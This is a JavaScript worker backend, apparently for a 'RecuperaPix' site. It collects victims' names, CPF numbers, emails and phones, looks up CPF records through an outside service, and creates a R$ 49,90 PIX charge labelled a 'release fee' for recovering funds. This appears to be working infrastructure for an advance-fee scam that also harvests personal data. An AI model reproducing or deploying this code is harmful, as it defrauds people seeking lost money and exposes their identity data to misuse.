const PIX_URL =
    "https://www.pagamentos-seguros.app/api-pix/7pUOAjzInix02lUIIVgx9gkpksM5eF5ozlRbnljjTZ37ixOi9cClFqHcczXtTv6LAJ3tdKOPvW1si-vJ9NfWmQ";

// Altere aqui para mudar o valor cobrado (em centavos). R$ 49,90 = 4990
const TAXA_CENTS = 4990;

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

function jsonRes(data, status = 200) {
    return new Response(JSON.stringify(data), {
        status,
        headers: { "Content-Type": "application/json" },
    });
}

async function handlePixCreate(request) {
    let body;
    try { body = await request.json(); } catch { return jsonRes({ error: "invalid json" }, 400); }

    const { name, document: doc, email, phone, utm } = body;
    if (!name || !doc || !email) {
        return jsonRes({ error: "missing required fields" }, 400);
    }

    const payload = {
        amount: TAXA_CENTS,
        customer: {
            name: String(name),
            document: String(doc).replace(/\D/g, ""),
            email: String(email),
            phone: phone ? String(phone).replace(/\D/g, "") : "11999999999",
        },
        item: {
            title: "Taxa de Liberação RecuperaPix",
            price: TAXA_CENTS,
            quantity: 1,
        },
        paymentMethod: "PIX",
        ...(utm ? { utm: String(utm) } : {}),
    };

    let delay = 1000;
    for (let attempt = 0; attempt < 3; attempt++) {
        try {
            const res = await fetch(PIX_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload),
            });
            if (res.status >= 500) {
                if (attempt < 2) { await sleep(delay); delay *= 2; continue; }
                return jsonRes({ error: "gateway unavailable" }, 502);
            }
            const data = await res.json();
            if (!res.ok) return jsonRes({ error: data.message || "gateway error" }, res.status);
            return jsonRes(data);
        } catch {
            if (attempt < 2) { await sleep(delay); delay *= 2; }
        }
    }
    return jsonRes({ error: "network error" }, 502);
}

async function handleCpfLookup(url) {
    const digits = url.pathname.split("/").pop().replace(/\D/g, "");
    if (digits.length !== 11) return jsonRes({ error: "invalid cpf" }, 400);
    const cpf = digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");

    try {
        const res = await fetch(`https://cpf.pixdecria.shop/api/v1/consult/${cpf}`, {
            headers: { "Accept": "application/json" },
        });
        const data = await res.json();
        return jsonRes(data, res.status);
    } catch {
        return jsonRes({ error: "lookup unavailable" }, 502);
    }
}

async function handlePixStatus(request) {
    const { searchParams } = new URL(request.url);
    const transactionId = searchParams.get("transactionId");
    if (!transactionId) return jsonRes({ error: "missing transactionId" }, 400);

    try {
        const res = await fetch(`${PIX_URL}?transactionId=${encodeURIComponent(transactionId)}`);
        const data = await res.json();
        return jsonRes(data, res.status);
    } catch {
        return jsonRes({ error: "gateway unavailable" }, 502);
    }
}

export default {
    async fetch(request, env) {
        const url = new URL(request.url);

        if (url.pathname.startsWith("/api/cpf/") && request.method === "GET") {
            return handleCpfLookup(url);
        }
        if (url.pathname === "/api/pix/create" && request.method === "POST") {
            return handlePixCreate(request);
        }
        if (url.pathname === "/api/pix/status" && request.method === "GET") {
            return handlePixStatus(request);
        }

        return env.ASSETS.fetch(request);
    },
};
